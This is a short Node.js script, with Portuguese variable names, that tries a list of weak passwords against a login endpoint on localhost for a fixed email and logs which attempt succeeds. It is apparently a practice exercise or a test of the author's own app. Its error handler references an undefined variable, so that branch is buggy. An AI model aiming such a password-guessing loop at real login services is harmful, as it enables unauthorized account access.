
let email = "danilo@99run.com"
let senhas = [
  "12345",
  "111",
  "222",
  "444",
  "1323",
  "1234",
  "123456",
  "122"
]

const axios = require('axios').default;

for(let i=0; i<senhas.length; i++){
  axios.post('http://localhost:3000/logar', {
    email: email,
    senha: senhas[i]
  })
  .then(function (response) {
    console.log(`Senha: ${senhas[i]}    logado: ${response.request._redirectable._redirectCount > 1}`)
  })
  .catch(function (error) {
    console.log(`Senha: ${senhas[i]}    logado: ${response.request._redirectable._redirectCount > 1}`)
  });
}